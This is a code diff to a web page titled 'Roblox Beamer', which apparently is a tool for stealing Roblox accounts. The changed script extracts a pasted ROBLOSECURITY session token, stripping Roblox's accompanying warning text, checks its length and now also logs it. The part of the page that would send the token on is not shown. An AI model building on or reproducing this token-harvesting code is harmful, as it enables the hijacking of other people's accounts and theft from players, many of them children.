@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>testRoblox Beamer</title>
+  <title>Roblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -73,6 +73,8 @@
 
       // Extract only the ROBLOSECURITY token (removes warning text)
       const token = match[0].split('=')[1];
+
+      console.log("Extracted Token:", token);  // Log the token for debugging
 
       if (!token || token.length !== 72) { // ROBLOSECURITY token is usually 72 characters long
         errorMessage.textContent = "Invalid ROBLOSECURITY token format!";
